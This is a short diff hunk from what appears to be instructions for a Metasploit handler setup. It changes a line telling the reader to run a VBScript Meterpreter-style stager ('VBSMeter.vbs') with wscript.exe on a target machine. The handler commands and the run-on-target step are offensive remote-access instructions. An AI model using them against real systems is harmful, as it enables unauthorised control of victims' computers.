@@ -28,5 +28,5 @@ set EnableStageEncoding true
 set ExitOnSession false
 exploit -j
 
-Then run: wscript.exe VBSMeter.js on Target
+Then run: wscript.exe VBSMeter.vbs on Target
 ```
